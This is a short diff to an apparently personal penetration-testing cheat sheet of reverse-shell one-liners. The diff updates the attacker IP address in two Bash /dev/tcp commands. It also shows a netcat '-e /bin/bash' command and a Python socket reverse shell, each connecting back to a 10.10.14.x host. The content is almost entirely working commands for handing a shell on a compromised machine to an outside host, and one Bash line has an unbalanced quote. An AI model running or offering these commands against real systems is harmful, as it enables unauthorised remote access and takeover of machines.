@@ -4,8 +4,8 @@
 
 
 ### Bash  
-`bash -i >& /dev/tcp/10.10.14.10/1234 0>&1`
-`bash -c 'bash -i >& /dev/tcp/10.10.14.12/1234 0>&1`
+`bash -i >& /dev/tcp/10.10.14.5/1234 0>&1`
+`bash -c 'bash -i >& /dev/tcp/10.10.14.5/1234 0>&1`
 
 ### Netcat  
 `nc -e /bin/bash 10.10.14.5 4444`
@@ -15,4 +15,3 @@
 
 ### Python 
 `python -c 'import socket,subprocess,os;s=socket.socket( socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
-			
